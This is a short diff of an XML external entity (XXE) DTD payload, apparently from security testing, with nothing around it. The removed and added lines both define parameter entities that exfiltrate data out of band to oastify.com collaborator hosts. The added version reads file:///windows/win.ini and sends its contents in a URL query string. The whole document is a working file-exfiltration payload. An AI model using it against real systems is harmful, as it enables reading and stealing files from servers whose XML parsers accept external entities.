@@ -1,2 +1,3 @@
-<!ENTITY % file SYSTEM "http://rgbjhe8jdnb11f81iauycyyw7nde1hp6.oastify.com">
-<!ENTITY % all "<!ENTITY % send SYSTEM 'http://rgbjhe8jdnb11f81iauycyyw7nde1hp6.oastify.com/?=%file;'>">
+<!ENTITY % p1 SYSTEM "file:///windows/win.ini">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://ob3gcb3g8k6ywc3yd7pv7vtt2k8bw2tqi.oastify.com/?x=%p1;'>">
+%p2;
